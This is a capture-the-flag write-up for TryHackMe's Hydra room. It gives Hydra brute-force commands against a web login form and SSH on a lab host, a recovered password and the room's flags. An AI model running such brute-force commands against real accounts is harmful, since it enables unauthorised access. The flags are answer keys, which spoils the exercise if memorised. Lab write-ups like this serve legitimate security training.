# TryHackMe: Hydra Room Writeup

Here is the writeup for the **Hydra** room of TryHackMe. Let’s dive into it…

---

## Task 1  
**No answer needed**

---

## Task 2

### 1. Use Hydra to bruteforce molly’s web password. What is flag 1?

- **Command Used:**
  ```bash
  sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/:login:username=^USER^&password=^PASSWORD^:F=incorrect" -V
  ```

- Using the above command, we obtain the web login password of Molly.

- **Flag 1:**  
  `THM{2673a7dd116de68e85c48ec0b1f2612e}`

<img width="1100" height="626" alt="image" src="https://github.com/user-attachments/assets/e00c3bc8-0449-4efb-900c-ed7430dff50a" />



- After logging in using the credentials, we successfully retrieve the flag.

<img width="1100" height="582" alt="image" src="https://github.com/user-attachments/assets/0c7aae63-4c45-4d95-a20a-ba0d9afd8e2e" />

<img width="1100" height="217" alt="image" src="https://github.com/user-attachments/assets/e037a14b-59a6-4395-81c4-bf0db63f05b6" />

---

### 2. Use Hydra to bruteforce molly’s SSH password. What is flag 2?


- **Command Used:**
  ```bash
  hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip> -t 4 ssh
  ```

  <img width="1100" height="151" alt="image" src="https://github.com/user-attachments/assets/858e0b8e-a999-4a0f-81c7-09b133eee0d3" />


- After running the above command, we obtain the SSH password of Molly.

- Now, connect using SSH with:
  ```bash
  ssh molly@<ip>
  # password: butterfly
  ```

<img width="886" height="445" alt="image" src="https://github.com/user-attachments/assets/a1bed2e7-72a2-49b1-9317-688f29e9423f" />


- **Flag 2:**  
  `THM{c8eeb0468febbadea859baeb33b2541b}`

---

Here we go!

Thanks for reading!

---
